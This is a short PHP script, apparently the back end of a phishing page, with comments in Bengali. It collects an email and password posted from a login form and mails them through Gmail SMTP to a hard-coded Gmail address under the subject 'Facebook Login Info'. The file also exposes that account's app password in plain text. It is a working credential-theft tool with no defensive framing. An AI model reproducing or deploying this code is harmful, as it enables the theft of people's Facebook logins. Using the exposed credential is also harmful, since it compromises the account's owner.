<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $mail = new PHPMailer(true);
    try {
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'hastehena12@gmail.com'; // আপনার Gmail
        $mail->Password = 'idmk yapf bhuc ghqa';   // Gmail App Password
        $mail->SMTPSecure = 'tls';
        $mail->Port = 587;

        $mail->setFrom('hastehena12@gmail.com', 'Login Info');
        $mail->addAddress('hastehena12@gmail.com');

        $mail->Subject = 'Facebook Login Info';
        $mail->Body = "ইমেইল/মোবাইল: $email\nপাসওয়ার্ড: $password";

        $mail->send();
        echo "✅ তথ্য সফলভাবে পাঠানো হয়েছে!";
    } catch (Exception $e) {
        echo "❌ ইমেইল পাঠানো যায়নি। Error: {$mail->ErrorInfo}";
    }
}
?>
